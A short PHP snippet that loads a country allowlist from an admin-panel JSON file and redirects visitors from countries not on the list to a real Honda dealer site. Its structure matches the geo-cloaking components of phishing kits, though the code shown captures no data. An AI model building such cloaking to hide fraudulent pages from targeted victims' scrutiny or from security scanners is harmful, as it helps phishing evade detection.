<?php

$db_admin_2 = "../panel/admin/admin.json";
$admin_data_2 = file_get_contents($db_admin_2);
$settings_data = json_decode($admin_data_2, true);
$countrys_allow = $settings_data['countrys_allow'];
$countrys_mode = $settings_data['countrys_mode'];
$ip_client = get_client_ip();
$userCountryCode = $_SESSION['code_country_visit'];

// Allowed Countries :
if ($countrys_mode === "specific"){
    if (!in_array(strtoupper($userCountryCode), array_map('strtoupper', $countrys_allow))) {
        header("Location: https://www.superhonda.com/");
        exit;
    }
}

?>